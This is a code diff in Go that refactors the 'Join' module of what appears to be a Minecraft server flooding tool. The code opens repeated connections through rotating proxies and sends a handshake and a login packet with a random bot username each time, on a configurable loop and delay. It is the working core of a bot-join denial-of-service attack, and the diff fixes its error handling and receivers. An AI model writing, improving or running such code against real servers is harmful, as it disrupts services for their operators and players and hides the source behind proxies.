@@ -14,28 +14,31 @@ import (
 
 type Join struct {
 	Config          *core.AttackConfig
-	isRunnig        bool
+	isRunning       bool
 	handshakePacket packet.Packet
 }
 
-func (j Join) Start() {
+func (j *Join) Start() {
+
 	ip, port, err := net.SplitHostPort(j.Config.Host)
 	if err != nil {
 		fmt.Println(err)
+		return
 	}
-	iport, _ := strconv.Atoi(port)
+	iport, err := strconv.Atoi(port)
 	if err != nil {
 		fmt.Println(err)
+		return
 	}
 	j.handshakePacket = mcutils.GetHandshakePacket(ip, iport, j.Config.Version, mcutils.Login)
-	j.isRunnig = true
+	j.isRunning = true
 	done := make(chan struct{})
 	for i := 0; i < j.Config.Loops; i++ {
 		j.loop(done)
 	}
 }
 
-func (j Join) loop(done chan struct{}) {
+func (j *Join) loop(done chan struct{}) {
 	ticker := time.NewTicker(j.Config.Delay)
 	defer ticker.Stop()
 	for {
@@ -50,26 +53,25 @@ func (j Join) loop(done chan struct{}) {
 	}
 }
 
-func (j Join) connect() error {
-	prox := j.Config.ProxyManager.GetNext()
-	conn, err := minecraft.DialMc(j.Config.Host, prox)
+func (j *Join) connect() error {
+	conn, err := minecraft.DialMc(j.Config.Host, j.Config.ProxyManager.GetNext())
 	if err != nil {
-		fmt.Println(err, " ", prox.Protocol)
 		return err
 	}
 	err = conn.WritePacket(j.handshakePacket)
 	if err != nil {
-		fmt.Println(err, " ", prox.Protocol)
+		fmt.Println(err)
 		return err
 	}
-	err = conn.WritePacket(mcutils.GetLoginPacket(utils.RandomName(16), j.Config.Version))
+	var name string = utils.RandomName(10)
+	joinpacket := mcutils.GetLoginPacket(&name, j.Config.Version)
+	err = conn.WritePacket(joinpacket)
 	if err != nil {
-		fmt.Println(err, " ", prox.Protocol)
 		return err
 	}
-	return nil
+	return err
 }
 
-func (j Join) Stop() {
-	j.isRunnig = false
+func (j *Join) Stop() {
+	j.isRunning = false
 }
